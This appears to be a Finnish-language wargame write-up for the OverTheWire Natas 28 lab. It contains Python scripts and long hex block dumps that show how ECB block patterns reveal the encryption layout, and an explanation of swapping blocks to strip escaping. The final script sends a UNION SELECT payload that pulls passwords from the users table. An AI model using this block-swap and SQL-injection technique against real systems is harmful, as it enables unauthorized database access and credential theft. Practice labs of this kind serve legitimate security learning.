1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
a549fda52b6d9b4e2632db31838856d5
9a2e2b5db6f31f19a14f75678eadaa90
4249b93e4dea0909479995b9c44b351a
========================================
input Length: 36 Encrypted query Length: 224

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
2011bbe488dde1bbec961b6170b30e12
29287f3cc5479e12e66f31c863b18047
56d5732dc8c770f64397158bc17a6e66
========================================
input Length: 37 Encrypted query Length: 224

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
8829a1f930ceb566b834441c0577402c
ac3b871c1c448386b45cd36d9e8f72f4
655149bbba2123d89d95417ea27f3a7b
========================================
input Length: 38 Encrypted query Length: 224

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
547602b52fae1566ac8e971f91f6d605
41c098c4bacdc5ed9357564e5105dd7e
64d0dcc868253692adfcbd3796d1bf8a
========================================
input Length: 39 Encrypted query Length: 224

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
a45a93ee4794d1b6204fb0920b68f27d
6486954aea46fb93e9ab85845b4f4bd0
d7ff2b725453fc294701e51f5d7c0f8e
========================================
input Length: 40 Encrypted query Length: 224

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
eda118f999f9495e8f3d973fba6528a3
896de90884f86108b167f8b4aea5d763
917232051483e68e458fd066167b30a3
========================================
input Length: 41 Encrypted query Length: 224

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
f2909c4d53781ee1777a012bb1a72541
a09522f301cf9d36ac7023f165948c5a
9739cd90522fa7a86f95773b56f9f8c0
========================================
input Length: 42 Encrypted query Length: 224

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3 <<<<<<<<<<<<<<<<
b39038c28df79b65d26151df58f7eaa3 <<<<<<<<<<<<<<<<
738a5ffb4a4500246775175ae596bbd6
f34df339c69edce11f6650bbced62702
========================================
input Length: 43 Encrypted query Length: 224

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3 <<<<<<<<<<<<<<<<
b39038c28df79b65d26151df58f7eaa3 <<<<<<<<<<<<<<<<
b4eda087d3c0bea2bedc1b6140b9e2eb
ca8cf4e610913abae39a067619204a5a
========================================
input Length: 44 Encrypted query Length: 224

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3 <<<<<<<<<<<<<<<<
b39038c28df79b65d26151df58f7eaa3 <<<<<<<<<<<<<<<<
ce82a9553b65b81280fb6d3bf2900f47
75fd5044fd063d26f6bb7f734b41c899
========================================
input Length: 45 Encrypted query Length: 256

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
1f74714d76fcc5d464c6a221e6ed98e4
6223a14d9c4291b98775b03fbc73d4ed
d8ae51d7da71b2b083d919a0d7b88b98
========================================
input Length: 46 Encrypted query Length: 256

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
ecd36f8fd9164d403540e449707d27e5
4257a343daadaaf2c0e3a1d71ce03dd1
7b7baca655f298a321e90e3f7a60d4d8
========================================
input Length: 47 Encrypted query Length: 256

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
5aef2a997da2363f72a3fad332d1736f
a773f3185094aa01408f1f97d037d385
678c5773ecc28f870e4f4ebc6c8070a4
========================================
input Length: 48 Encrypted query Length: 256

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
8925158cfc5ac06d22bfda0b72c8f151
a77e8ed1aabe0b5d05c4ffe6ac1423ab
478eb1a1fe261a2c6c15061109b3feda
========================================
input Length: 49 Encrypted query Length: 256

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
adf8a1ad0177ed1ecad3ac7c1082aa9e
bdfa1054ec68515cf96f2a5544591947
904f4b2abf2c2d7686aa72a53151c970
========================================


Eteenpäin kuitenkin tein ja kokeilin normi SQL injektiolla normi pilkun `'` niin toistui tietokannan vitsejä ainakin.

Python skripti osuus lohkoanlyysi ja tarkka testausta jatkuu. 

Tässä on nyt selkeästi koottu jatkettu versio skriptistä, joka sisältää sekä alkuperäisen lohkoanalyysin että erilliset testisyötteet "a"*11 + "!" ja "a"*12. Tämä auttaa sinua kohdistamaan syötteen tarkasti lohkon alkuun ja tarkkailemaan lohkomuutoksia.


import requests
from urllib.parse import unquote
import binascii
import base64

url = "http://natas28.natas.labs.overthewire.org/index.php"
username = "natas28"
password = "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj"

# Peruslohkoanalyysi
for i in range(1, 50):
    data = {"query": "a" * i}
    data_length = len(data['query'])
    res = requests.post(url=url, data=data, auth=(username, password))
    encrypted_raw = binascii.hexlify(base64.b64decode(unquote(res.url[60:]))).decode()
    encrypted_raw_length = len(encrypted_raw)
    print("input Length: " + str(data_length) + " Encrypted query Length: " + str(encrypted_raw_length))
    block_size = 32
    for i in range(encrypted_raw_length // block_size):
        print(encrypted_raw[block_size * i : block_size * (i + 1)])
    print("=" * 40)

# Tarkka testisyöte: "a"*11 + "!"
data = {"query": "a" * 11 + "!"}
data_length = len(data['query'])
res = requests.post(url=url, data=data, auth=(username, password))
encrypted_raw = binascii.hexlify(base64.b64decode(unquote(res.url[60:]))).decode()
encrypted_raw_length = len(encrypted_raw)
print("input Length: " + str(data_length) + " Encrypted query Length: " + str(encrypted_raw_length))
for i in range(encrypted_raw_length // block_size):
    print(encrypted_raw[block_size * i : block_size * (i + 1)])
print("=" * 40)

# Tarkka testisyöte: "a"*12
data = {"query": "a" * 12}
data_length = len(data['query'])
res = requests.post(url=url, data=data, auth=(username, password))
encrypted_raw = binascii.hexlify(base64.b64decode(unquote(res.url[60:]))).decode()
encrypted_raw_length = len(encrypted_raw)
print("input Length: " + str(data_length) + " Encrypted query Length: " + str(encrypted_raw_length))
for i in range(encrypted_raw_length // block_size):
    print(encrypted_raw[block_size * i : block_size * (i + 1)])
print("=" * 40)



**mitä tässä tuloksessa oikein tapahtui? ja mitä tämä ylempi skripti teki siis?**

Skripti lähettää POST-pyynnön palvelimelle, jossa on SQL-kyselyyn liittyvä salaus. Se mittaa salatun vastauksen pituuden ja purkaa salauksen base64 → hex. Se tulostaa salauksen lohkoittain (32 heksamerkkiä = 16 tavua).Tarkoitus on ymmärtää, miten syötteen pituus vaikuttaa salattuun muotoon.

Loppu osassa syöteessä se löysi/toisti **täsmälleen samaa** salattu lohko on täsmälleen sama (ECB:n ominaisuus)

Esimerkiksi "a"*12 antaa saman salauksen joka kerta

Jos "a"*12 + "!" antaa saman pituuden ja lohkot kuin "a"*12, se tarkoittaa että ! ei vaikuta lohkoihin (esim. jää paddingin puolelle)

Kun syötteen pituus on 13 ja mukana on ', salauksen pituus kasvaa 160 → 192, koska ' escapataan → \'. Jos ' saadaan lohkon alkuun, \ jää edelliseen lohkoon ja voidaan korvata toisella lohkolla, jolloin ' jää yksin ja SQL-injektio onnistuu.


### 🔐 Miksi `'` kasvattaa salauksen pituutta?

- `'` on erityismerkki → sovellus muuttaa sen ennen salausta: `'` → `\'`
- Tämä lisää yhden merkin → pituus kasvaa
- Jos `'` on lohkon lopussa:
  - `\` menee siihen lohkoon
  - `'` siirtyy seuraavan lohkon alkuun
- ECB salaa lohkot erikseen → voimme vaihtaa lohkon, jossa on `\`, pois
- `'` jää yksin → ei enää escapattu → SQL-injektio toimii


┌──(kali㉿kali)-[~/Desktop/Python koodit]
└─$ python pythonkoodi28-2.py   
input Length: 1 Encrypted query Length: 160
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
ab880a8f136fbeb98967891324a1b075
bdfa1054ec68515cf96f2a5544591947
904f4b2abf2c2d7686aa72a53151c970
========================================
input Length: 2 Encrypted query Length: 160
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
b130a531bec89c705213bfa5c9667ac7
48799a07b1d29b5982015c9355c2e00e
aded9bdbaca6a73b71b35a010d2c4c57
========================================
input Length: 3 Encrypted query Length: 160
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
2f5293a63acb9fe8c7b4e824b76d6a1d
9a2e2b5db6f31f19a14f75678eadaa90
4249b93e4dea0909479995b9c44b351a
========================================
input Length: 4 Encrypted query Length: 160
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
3504a9a9675ffd614b4f1f90d284fcaa
29287f3cc5479e12e66f31c863b18047
56d5732dc8c770f64397158bc17a6e66
========================================
input Length: 5 Encrypted query Length: 160
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c36a1f0469158a3052166146a5e3f2ec
ac3b871c1c448386b45cd36d9e8f72f4
655149bbba2123d89d95417ea27f3a7b
========================================
input Length: 6 Encrypted query Length: 160
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
4a11ffe73afd15daa05eb3c3486dcde1
41c098c4bacdc5ed9357564e5105dd7e
64d0dcc868253692adfcbd3796d1bf8a
========================================
input Length: 7 Encrypted query Length: 160
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
9fde1cef6e3f84a172633f3074fc8e18
6486954aea46fb93e9ab85845b4f4bd0
d7ff2b725453fc294701e51f5d7c0f8e
========================================
input Length: 8 Encrypted query Length: 160
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
453e0020602f4dccd50f0eb7709477c2
896de90884f86108b167f8b4aea5d763
917232051483e68e458fd066167b30a3
========================================
input Length: 9 Encrypted query Length: 160
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
9e622686a52640595706099abcb052bb
a09522f301cf9d36ac7023f165948c5a
9739cd90522fa7a86f95773b56f9f8c0
========================================
input Length: 10 Encrypted query Length: 160
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
738a5ffb4a4500246775175ae596bbd6
f34df339c69edce11f6650bbced62702
========================================
input Length: 11 Encrypted query Length: 160
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b4eda087d3c0bea2bedc1b6140b9e2eb
ca8cf4e610913abae39a067619204a5a
========================================
input Length: 12 Encrypted query Length: 160
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
ce82a9553b65b81280fb6d3bf2900f47
75fd5044fd063d26f6bb7f734b41c899
========================================
input Length: 13 Encrypted query Length: 192
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
1f74714d76fcc5d464c6a221e6ed98e4
6223a14d9c4291b98775b03fbc73d4ed
d8ae51d7da71b2b083d919a0d7b88b98
========================================
input Length: 14 Encrypted query Length: 192
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
ecd36f8fd9164d403540e449707d27e5
4257a343daadaaf2c0e3a1d71ce03dd1
7b7baca655f298a321e90e3f7a60d4d8
========================================
input Length: 15 Encrypted query Length: 192
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
5aef2a997da2363f72a3fad332d1736f
a773f3185094aa01408f1f97d037d385
678c5773ecc28f870e4f4ebc6c8070a4
========================================
input Length: 16 Encrypted query Length: 192
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
8925158cfc5ac06d22bfda0b72c8f151
a77e8ed1aabe0b5d05c4ffe6ac1423ab
478eb1a1fe261a2c6c15061109b3feda
========================================
input Length: 17 Encrypted query Length: 192
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
adf8a1ad0177ed1ecad3ac7c1082aa9e
bdfa1054ec68515cf96f2a5544591947
904f4b2abf2c2d7686aa72a53151c970
========================================
input Length: 18 Encrypted query Length: 192
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
53d9499ebcad6861f04b7cdc24f30462
48799a07b1d29b5982015c9355c2e00e
aded9bdbaca6a73b71b35a010d2c4c57
========================================
input Length: 19 Encrypted query Length: 192
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
a549fda52b6d9b4e2632db31838856d5
9a2e2b5db6f31f19a14f75678eadaa90
4249b93e4dea0909479995b9c44b351a
========================================
input Length: 20 Encrypted query Length: 192
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
2011bbe488dde1bbec961b6170b30e12
29287f3cc5479e12e66f31c863b18047
56d5732dc8c770f64397158bc17a6e66
========================================
input Length: 21 Encrypted query Length: 192
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
8829a1f930ceb566b834441c0577402c
ac3b871c1c448386b45cd36d9e8f72f4
655149bbba2123d89d95417ea27f3a7b
========================================
input Length: 22 Encrypted query Length: 192
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
547602b52fae1566ac8e971f91f6d605
41c098c4bacdc5ed9357564e5105dd7e
64d0dcc868253692adfcbd3796d1bf8a
========================================
input Length: 23 Encrypted query Length: 192
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
a45a93ee4794d1b6204fb0920b68f27d
6486954aea46fb93e9ab85845b4f4bd0
d7ff2b725453fc294701e51f5d7c0f8e
========================================
input Length: 24 Encrypted query Length: 192
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
eda118f999f9495e8f3d973fba6528a3
896de90884f86108b167f8b4aea5d763
917232051483e68e458fd066167b30a3
========================================
input Length: 25 Encrypted query Length: 192
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
f2909c4d53781ee1777a012bb1a72541
a09522f301cf9d36ac7023f165948c5a
9739cd90522fa7a86f95773b56f9f8c0
========================================
input Length: 26 Encrypted query Length: 192
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
738a5ffb4a4500246775175ae596bbd6
f34df339c69edce11f6650bbced62702
========================================
input Length: 27 Encrypted query Length: 192
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b4eda087d3c0bea2bedc1b6140b9e2eb
ca8cf4e610913abae39a067619204a5a
========================================
input Length: 28 Encrypted query Length: 192
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
ce82a9553b65b81280fb6d3bf2900f47
75fd5044fd063d26f6bb7f734b41c899
========================================
input Length: 29 Encrypted query Length: 224
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
1f74714d76fcc5d464c6a221e6ed98e4
6223a14d9c4291b98775b03fbc73d4ed
d8ae51d7da71b2b083d919a0d7b88b98
========================================
input Length: 30 Encrypted query Length: 224
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
ecd36f8fd9164d403540e449707d27e5
4257a343daadaaf2c0e3a1d71ce03dd1
7b7baca655f298a321e90e3f7a60d4d8
========================================
input Length: 31 Encrypted query Length: 224
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
5aef2a997da2363f72a3fad332d1736f
a773f3185094aa01408f1f97d037d385
678c5773ecc28f870e4f4ebc6c8070a4
========================================
input Length: 32 Encrypted query Length: 224
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
8925158cfc5ac06d22bfda0b72c8f151
a77e8ed1aabe0b5d05c4ffe6ac1423ab
478eb1a1fe261a2c6c15061109b3feda
========================================
input Length: 33 Encrypted query Length: 224
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
adf8a1ad0177ed1ecad3ac7c1082aa9e
bdfa1054ec68515cf96f2a5544591947
904f4b2abf2c2d7686aa72a53151c970
========================================
input Length: 34 Encrypted query Length: 224
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
53d9499ebcad6861f04b7cdc24f30462
48799a07b1d29b5982015c9355c2e00e
aded9bdbaca6a73b71b35a010d2c4c57
========================================
input Length: 35 Encrypted query Length: 224
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
a549fda52b6d9b4e2632db31838856d5
9a2e2b5db6f31f19a14f75678eadaa90
4249b93e4dea0909479995b9c44b351a
========================================
input Length: 36 Encrypted query Length: 224
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
2011bbe488dde1bbec961b6170b30e12
29287f3cc5479e12e66f31c863b18047
56d5732dc8c770f64397158bc17a6e66
========================================
input Length: 37 Encrypted query Length: 224
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
8829a1f930ceb566b834441c0577402c
ac3b871c1c448386b45cd36d9e8f72f4
655149bbba2123d89d95417ea27f3a7b
========================================
input Length: 38 Encrypted query Length: 224
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
547602b52fae1566ac8e971f91f6d605
41c098c4bacdc5ed9357564e5105dd7e
64d0dcc868253692adfcbd3796d1bf8a
========================================
input Length: 39 Encrypted query Length: 224
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
a45a93ee4794d1b6204fb0920b68f27d
6486954aea46fb93e9ab85845b4f4bd0
d7ff2b725453fc294701e51f5d7c0f8e
========================================
input Length: 40 Encrypted query Length: 224
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
eda118f999f9495e8f3d973fba6528a3
896de90884f86108b167f8b4aea5d763
917232051483e68e458fd066167b30a3
========================================
input Length: 41 Encrypted query Length: 224
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
f2909c4d53781ee1777a012bb1a72541
a09522f301cf9d36ac7023f165948c5a
9739cd90522fa7a86f95773b56f9f8c0
========================================
input Length: 42 Encrypted query Length: 224
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
738a5ffb4a4500246775175ae596bbd6
f34df339c69edce11f6650bbced62702
========================================
input Length: 43 Encrypted query Length: 224
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
b4eda087d3c0bea2bedc1b6140b9e2eb
ca8cf4e610913abae39a067619204a5a
========================================
input Length: 44 Encrypted query Length: 224
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
ce82a9553b65b81280fb6d3bf2900f47
75fd5044fd063d26f6bb7f734b41c899
========================================
input Length: 45 Encrypted query Length: 256
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
1f74714d76fcc5d464c6a221e6ed98e4
6223a14d9c4291b98775b03fbc73d4ed
d8ae51d7da71b2b083d919a0d7b88b98
========================================
input Length: 46 Encrypted query Length: 256
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
ecd36f8fd9164d403540e449707d27e5
4257a343daadaaf2c0e3a1d71ce03dd1
7b7baca655f298a321e90e3f7a60d4d8
========================================
input Length: 47 Encrypted query Length: 256
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
5aef2a997da2363f72a3fad332d1736f
a773f3185094aa01408f1f97d037d385
678c5773ecc28f870e4f4ebc6c8070a4
========================================
input Length: 48 Encrypted query Length: 256
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
8925158cfc5ac06d22bfda0b72c8f151
a77e8ed1aabe0b5d05c4ffe6ac1423ab
478eb1a1fe261a2c6c15061109b3feda
========================================
input Length: 49 Encrypted query Length: 256
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
adf8a1ad0177ed1ecad3ac7c1082aa9e
bdfa1054ec68515cf96f2a5544591947
904f4b2abf2c2d7686aa72a53151c970
========================================
input Length: 12 Encrypted query Length: 160
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
909a68162c84bd23156c942120760d4b
75fd5044fd063d26f6bb7f734b41c899
========================================
input Length: 12 Encrypted query Length: 160
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
ce82a9553b65b81280fb6d3bf2900f47
75fd5044fd063d26f6bb7f734b41c899
========================================


**JATKUU**
Nyt lisää skriptin osuutta, josta otetaan käyttöön toi SQL injketio salasanojen hakemista tietokannasta.

Tämä SQL injketio muodostaa kuin tämän komennon: `"a'*9+' UNION SELECT ALL password from users; #"` - seuraavaksi Lähettää POST-pyynnön: requests.post(...) lähettää datan palvelimelle HTTP-autentikoinnilla. Dekoodaa vastauksen: Palvelimen vastaus dekoodataan ensin URL:stä, sitten base64:stä, ja lopuksi hex-muotoon. Tulostaa salatun datan lohkoina: Skripti pilkkoo salatun vastauksen 32 tavun lohkoihin ja tulostaa ne.


import requests
from urllib.parse import unquote
import binascii
import base64

url = "http://natas28.natas.labs.overthewire.org/index.php"
username = "natas28"
password = "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj"

# Peruslohkoanalyysi
for i in range(1, 50):
    data = {"query": "a" * i}
    data_length = len(data['query'])
    res = requests.post(url=url, data=data, auth=(username, password))
    encrypted_raw = binascii.hexlify(base64.b64decode(unquote(res.url[60:]))).decode()
    encrypted_raw_length = len(encrypted_raw)
    print("input Length: " + str(data_length) + " Encrypted query Length: " + str(encrypted_raw_length))
    block_size = 32
    for i in range(encrypted_raw_length // block_size):
        print(encrypted_raw[block_size * i : block_size * (i + 1)])
    print("=" * 40)

# Tarkka testisyöte: "a"*11 + "!"
data = {"query": "a" * 11 + "!"}
data_length = len(data['query'])
res = requests.post(url=url, data=data, auth=(username, password))
encrypted_raw = binascii.hexlify(base64.b64decode(unquote(res.url[60:]))).decode()
encrypted_raw_length = len(encrypted_raw)
print("input Length: " + str(data_length) + " Encrypted query Length: " + str(encrypted_raw_length))
for i in range(encrypted_raw_length // block_size):
    print(encrypted_raw[block_size * i : block_size * (i + 1)])
print("=" * 40)

# Tarkka testisyöte: "a"*12
data = {"query": "a" * 12}
data_length = len(data['query'])
res = requests.post(url=url, data=data, auth=(username, password))
encrypted_raw = binascii.hexlify(base64.b64decode(unquote(res.url[60:]))).decode()
encrypted_raw_length = len(encrypted_raw)
print("input Length: " + str(data_length) + " Encrypted query Length: " + str(encrypted_raw_length))
for i in range(encrypted_raw_length // block_size):
    print(encrypted_raw[block_size * i : block_size * (i + 1)])
print("=" * 40)

# Tarkka testisyöte ja tässä tapahtuu SQL injektio osuus:
data = {"query":"a'*10+' UNION SELECT ALL password from users; #"}
data_length = len(data['query'])

res = requests.post(url=url, data=data, auth=(username, password))
encrypted_raw = binascii.hexlify(base64.b64decode(unquote(res.url[60:]))).decode()
encrypted_raw_length = len(encrypted_raw)
print("input Length: "+str(data_length)+" Encrypted query Length: "+str(encrypted_raw_length)+"\n")

block_size = 32
for i in range(encrypted_raw_length//block_size):
    print(encrypted_raw[block_size*i:block_size*(i+1)])
print("="*40)



**TULOS** skippasin osan, ettei tule turhan pitkä tulosta ja tuloksena on **input length 46 encrypted query length: 256** osa.


┌──(kali㉿kali)-[~/Desktop/Python koodit]
└─$ sudo nano pythonkoodi28-2.py
[sudo] password for kali: 
                                                                                                                                                  
┌──(kali㉿kali)-[~/Desktop/Python koodit]
└─$ python pythonkoodi28-2.py   
input Length: 1 Encrypted query Length: 160
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
ab880a8f136fbeb98967891324a1b075
bdfa1054ec68515cf96f2a5544591947
904f4b2abf2c2d7686aa72a53151c970
========================================
input Length: 2 Encrypted query Length: 160
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
b130a531bec89c705213bfa5c9667ac7
48799a07b1d29b5982015c9355c2e00e
aded9bdbaca6a73b71b35a010d2c4c57
========================================
input Length: 3 Encrypted query Length: 160
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
2f5293a63acb9fe8c7b4e824b76d6a1d
9a2e2b5db6f31f19a14f75678eadaa90
4249b93e4dea0909479995b9c44b351a
========================================
input Length: 4 Encrypted query Length: 160
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
3504a9a9675ffd614b4f1f90d284fcaa
29287f3cc5479e12e66f31c863b18047
56d5732dc8c770f64397158bc17a6e66
========================================

....................
.........................
========================================
input Length: 43 Encrypted query Length: 224
